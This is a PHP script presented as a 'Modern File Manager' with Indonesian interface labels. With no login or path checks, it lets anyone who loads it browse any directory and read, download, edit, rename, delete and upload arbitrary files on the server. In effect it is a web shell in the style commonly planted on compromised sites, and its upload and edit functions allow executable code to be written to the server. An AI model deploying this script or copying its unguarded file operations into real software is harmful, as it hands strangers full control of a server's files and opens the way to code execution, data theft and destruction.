<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$realDir = realpath($dir);

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldPath = $_POST['rename_old'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    rename($oldPath, $newPath);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    file_put_contents($_POST['edit_file'], $_POST['file_content']);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (is_file($file)) {
        unlink($file);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['new_folder'])) {
    $newFolder = $realDir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder, 0755, true);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['new_file'])) {
    $newFile = $realDir . DIRECTORY_SEPARATOR . basename($_POST['new_file']);
    if (!file_exists($newFile)) {
        file_put_contents($newFile, '');
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $realDir . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (is_file($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo "<h2>Edit File - " . basename($file) . "</h2>";
        echo '<form method="POST" style="padding:20px">
                <input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '">
                <textarea name="file_content" style="width:100%; height:400px; font-family:monospace;">' . $content . '</textarea><br><br>
                <button type="submit" class="btn">Save</button>
                <a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) . '" class="btn gray">Kembali</a>
              </form>';
        exit;
    }
}

function listFiles($path) {
    $files = scandir($path);
    $dirs = [];
    $regularFiles = [];

    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullPath = realpath($path . DIRECTORY_SEPARATOR . $file);
        if (is_dir($fullPath)) {
            $dirs[] = $fullPath;
        } else {
            $regularFiles[] = $fullPath;
        }
    }

    sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
    sort($regularFiles, SORT_NATURAL | SORT_FLAG_CASE);

    foreach (array_merge($dirs, $regularFiles) as $fullPath) {
        $file = basename($fullPath);
        echo '<tr>';
        echo '<td>' . htmlspecialchars($file) . '</td>';
        echo '<td>' . (is_dir($fullPath) ? 'Folder' : 'File') . '</td>';
        echo '<td>' . (is_dir($fullPath) ? '-' : number_format(filesize($fullPath))) . '</td>';
        echo '<td>';
        if (is_dir($fullPath)) {
            echo '<a class="btn small" href="?dir=' . urlencode($fullPath) . '">Open</a>';
        } else {
            echo '<a class="btn small" href="?download=' . urlencode($fullPath) . '">Download</a> ';
            echo '<a class="btn small" href="?edit=' . urlencode($fullPath) . '">Edit</a> ';
            echo '<a class="btn small red" href="?delete=' . urlencode($fullPath) . '" onclick="return confirm(\'Hapus file ini?\')">Delete</a> ';
        }
        echo '<a class="btn small blue" href="#" onclick="showRename(\'' . htmlspecialchars($fullPath) . '\', \'' . htmlspecialchars(basename($fullPath)) . '\')">Rename</a>';
        echo '</td>';
        echo '</tr>';
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Modern File Manager</title>
    <style>
        body {
            font-family: "Segoe UI", sans-serif;
            margin: 0;
            padding: 20px;
            background: #eef2f7;
        }
        h2 {
            color: #2c3e50;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        th, td {
            padding: 14px;
            border-bottom: 1px solid #e0e0e0;
            text-align: left;
        }
        th {
            background: #f9fafb;
            font-weight: bold;
        }
        .btn {
            background: #3498db;
            color: white;
            padding: 6px 12px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
            margin: 2px 0;
        }
        .btn.gray { background: #95a5a6; }
        .btn.red { background: #e74c3c; }
        .btn.blue { background: #2980b9; }
        .btn.small { font-size: 12px; padding: 4px 8px; }
        .upload-form {
            background: white;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        #renameBox {
            display:none;
            position:fixed;
            top:30%;
            left:50%;
            transform: translate(-50%, -30%);
            background:white;
            padding:20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            border-radius: 6px;
            z-index: 9999;
        }
        #renameBox input[type="text"] {
            width: 100%;
            padding: 6px;
            margin: 10px 0;
        }
        .back-link {
            margin-bottom: 10px;
            display: inline-block;
        }
        .form-inline {
            display: inline-block;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <h2>File Manager - <?= htmlspecialchars($realDir) ?></h2>

    <form method="POST" enctype="multipart/form-data" class="upload-form">
        <label>Upload file:</label>
        <input type="file" name="file" required>
        <button type="submit" class="btn">Upload</button>
    </form>

    <form method="POST" class="form-inline">
        <input type="text" name="new_folder" placeholder="Nama folder baru" required>
        <button type="submit" class="btn">Buat Folder</button>
    </form>

    <form method="POST" class="form-inline">
        <input type="text" name="new_file" placeholder="Nama file baru" required>
        <button type="submit" class="btn">Buat File</button>
    </form>

    <table>
        <tr>
            <th>Nama</th><th>Tipe</th><th>Ukuran (byte)</th><th>Aksi</th>
        </tr>
        <tr><td colspan="4"><a class="btn small gray" href="?dir=<?= urlencode(dirname($realDir)) ?>">.. (Up)</a></td></tr>
        <?php listFiles($realDir); ?>
    </table>

    <div id="renameBox">
        <form method="POST">
            <input type="hidden" name="rename_old" id="rename_old">
            <label>Rename to:</label>
            <input type="text" name="rename_new" id="rename_new" required>
            <button type="submit" class="btn">Rename</button>
            <button type="button" class="btn gray" onclick="document.getElementById('renameBox').style.display='none'">Cancel</button>
        </form>
    </div>

    <script>
        function showRename(oldPath, filename) {
            document.getElementById('rename_old').value = oldPath;
            document.getElementById('rename_new').value = filename;
            document.getElementById('renameBox').style.display = 'block';
        }
    </script>
</body>
</html>